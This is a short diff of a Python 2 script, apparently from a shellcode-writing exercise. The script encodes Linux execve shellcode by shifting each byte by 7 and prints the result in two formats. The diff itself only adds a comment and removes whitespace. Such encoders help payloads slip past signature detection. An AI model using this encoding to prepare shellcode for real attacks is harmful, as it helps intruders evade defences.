@@ -49,6 +49,7 @@ shellcode = (
     "\xc9\x89\xca\x6a\x0b\x58\xcd\x80"
 )
 
+# byte[0] == shellcode length
 encoded = "\\x%02x," % len(bytearray(shellcode))
 encoded2 = "0x%02x," % len(bytearray(shellcode)) 
 
@@ -66,7 +67,7 @@ for x in bytearray(shellcode) :
         encoded += '%02x'%(x+7)
         encoded2 += '0x'
         encoded2 += '%02x,' %(x+7)
-    
+
 print '\n%s\n\n%s\n\nShellcode Length: %d\n' % (encoded, encoded2, len(bytearray(shellcode)))
 ```
 
